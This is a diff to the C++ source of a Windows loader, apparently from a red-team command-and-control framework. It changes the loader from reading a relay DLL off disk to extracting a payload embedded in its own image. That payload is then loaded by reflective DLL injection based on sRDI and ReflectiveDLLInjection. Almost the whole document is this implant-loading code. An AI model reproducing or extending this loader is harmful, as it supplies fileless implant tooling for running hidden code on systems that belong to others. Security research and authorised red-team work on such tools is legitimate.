@@ -1,4 +1,6 @@
 #include "StdAfx.h"
+#include "AccessPayload.h"
+#include "tlhelp32.h"
 
 #ifdef _WIN64
 #define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
@@ -17,16 +19,6 @@ T Rva2Va(V base, U rva)
 static inline size_t
 AlignValueUp(size_t value, size_t alignment) {
 	return (value + alignment - 1) & ~(alignment - 1);
-}
-
-
-bool GetTargetDll(std::string_view s, MWR::ByteVector& result)
-{
-	if (!std::filesystem::exists(s))
-		return false;
-	auto ifile = std::ifstream{ s, std::ios::binary };
-	result = MWR::ByteVector((std::istreambuf_iterator<char>(ifile)), std::istreambuf_iterator<char>());
-	return true;
 }
 
 #pragma warning( push )
@@ -68,24 +60,33 @@ LONG CALLBACK PatchCppException(PEXCEPTION_POINTERS exceptionInfo)
 	return EXCEPTION_CONTINUE_SEARCH;
 }
 
+/// Search for payload in own memory.
+/// @returns pointer to dll file stored as resource.
+char* GetTargetDll()
+{
+	auto ME32 = MODULEENTRY32{ sizeof(MODULEENTRY32), };
+	auto moduleHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
+
+	Module32First(moduleHandle, &ME32);
+	CloseHandle(moduleHandle);
+
+	auto baseAddress = ME32.modBaseAddr;
+	auto dosHeader = Rva2Va<PIMAGE_DOS_HEADER>(baseAddress, 0);
+	auto ntHeaders = Rva2Va<PIMAGE_NT_HEADERS>(baseAddress, dosHeader->e_lfanew);
+
+	return GetPayload(FindStartOfResource(baseAddress, ntHeaders->OptionalHeader.SizeOfImage));
+}
+
 /// Entry point of the application.
 /// @param argc number of program arguments.
 /// @param argv vector of program arguments.
 int main(int argc, char* argv[])
 {
-	std::string filename = "NodeRelayDll_rwdi64.dll";
-	if (argc > 1)
-		filename = argv[1];
-
-	MWR::ByteVector dllFile;
-	if (!GetTargetDll(filename, dllFile))
-		return 3;
-
 	// Loader code based on Shellcode Reflective DLL Injection by Nick Landers https://github.com/monoxgas/sRDI
 	// which is derived from "Improved Reflective DLL Injection" from Dan Staples https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
 	// which itself is derived from the original project by Stephen Fewer. https://github.com/stephenfewer/ReflectiveDLLInjection
 
-	auto dllData = dllFile.data();
+	auto dllData = GetTargetDll();
 	auto dosHeader = Rva2Va<PIMAGE_DOS_HEADER>(dllData, 0);
 	auto ntHeaders = Rva2Va<PIMAGE_NT_HEADERS>(dllData, dosHeader->e_lfanew);
 	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
